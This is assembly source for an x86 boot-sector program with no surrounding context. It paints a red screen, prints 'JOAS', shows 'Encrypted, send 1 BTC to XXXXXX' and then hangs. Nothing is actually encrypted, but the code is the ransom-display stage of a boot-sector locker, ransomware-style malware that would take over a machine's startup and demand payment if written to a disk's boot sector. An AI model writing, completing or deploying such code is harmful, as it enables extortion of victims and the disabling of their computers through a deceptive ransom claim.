BITS 16           ; 16-bit code for real mode
ORG 0x7c00        ; Standard loading address for the bootloader

start:
    xor ax, ax    ; Clear the AX register
    mov ds, ax    ; Set the data segment to 0
    mov es, ax    ; Set the extra segment to 0

    ; Stack configuration
    mov ss, ax
    mov sp, 0x7c00
    cli            ; Disable interrupts

    ; Set the screen for red background and light gray text
    mov ax, 0x0003 ; Text mode 80x25
    int 0x10       ; Video interrupt
    mov ax, 0x0600 ; Function to clear the screen
    mov bh, 0x4C   ; Attribute (red background, light gray text)
    xor cx, cx     ; Upper left corner
    mov dx, 184Fh  ; Lower right corner
    int 0x10       ; Video interrupt

    ; Display the ASCII art "JOAS"
    mov si, joas_art
    call print_string

    ; Display the additional message
    mov si, btc_message
    call print_string

    jmp $          ; Infinite loop to keep the bootloader active

print_string:       ; Function to print strings with color support
    mov ah, 0x0E   ; BIOS function for displaying a TTY character
.repeat_char:
    lodsb          ; Load the next byte of the string into AL
    test al, al    ; Test if it's the null byte
    jz .done       ; If zero, finish
    int 0x10       ; BIOS video interrupt
    jmp .repeat_char
.done:
    ret

joas_art:
    db ' JJJJ  OOO  AAAAA  SSSS ', 13, 10, 0
btc_message:
    db 'Encrypted, send 1 BTC to XXXXXX', 13, 10, 0

times 510 - ($ - $$) db 0  ; Fill up to 510 bytes with zeros
dw 0xaa55                  ; Boot signature
